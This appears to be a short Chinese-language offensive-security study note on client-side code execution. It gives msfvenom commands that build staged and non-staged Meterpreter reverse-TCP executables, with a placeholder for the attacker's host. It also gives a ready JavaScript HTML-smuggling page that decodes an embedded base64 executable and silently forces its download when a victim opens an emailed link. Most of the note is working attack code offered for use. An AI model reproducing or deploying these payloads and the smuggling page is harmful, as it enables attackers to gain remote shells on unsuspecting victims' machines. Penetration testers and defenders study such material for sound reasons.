# Microsoft Office Client Side Code Executtion
## Staged vs Non-staged Payloads
一般來說平常使用相關 Payload 框架，都會搭配可以使用弱點，也就是說弱點是拿來突破防禦機制，Payload可以說是維持存取的一種手段，維持存取的類型Payload分為
### 以下meterpreter為例:
#### Non-staged Payload (無階段性)
直接在記憶體中呼叫 執行完整的Payload
通常送過去的Payload 大小較大
Ex: windows/meterpreter_reverse_tcp
##### 產生一個 exe
```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o non-staged.exe
```
#### Staged Payload (有階段性)
只送一小段 Payload 做接應
較穩定，且有其他功能
Ex: windows/meterpreter/reverse_tcp
##### 產生一個 exe
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=x -f exe -o staged.exe
```
## HTML Smuggling 
想要在受害端機器上下載並執行相關的惡意程式，攻擊者會經常使用更謹慎的投放的方式。攻擊者可能將鏈接嵌入到電子郵件，當受害者閱讀電子郵件並存取網頁時，網頁自動下載惡意程式，這種行為就稱為HTML Smuggling
### Example
```
<html><body><script>	
function base64ToArrayBuffer(base64) { var binary_string = window.atob(base64); var len = binary_string.length; var bytes = new Uint8Array( len ); for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); } return bytes.buffer;}
var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAA... (產生的base64 )
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'staged.exe'; var a = document.createElement('a');
document.body.appendChild(a); a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url; a.download = fileName; a.click();
window.URL.revokeObjectURL(url);
</script></body></html>
```

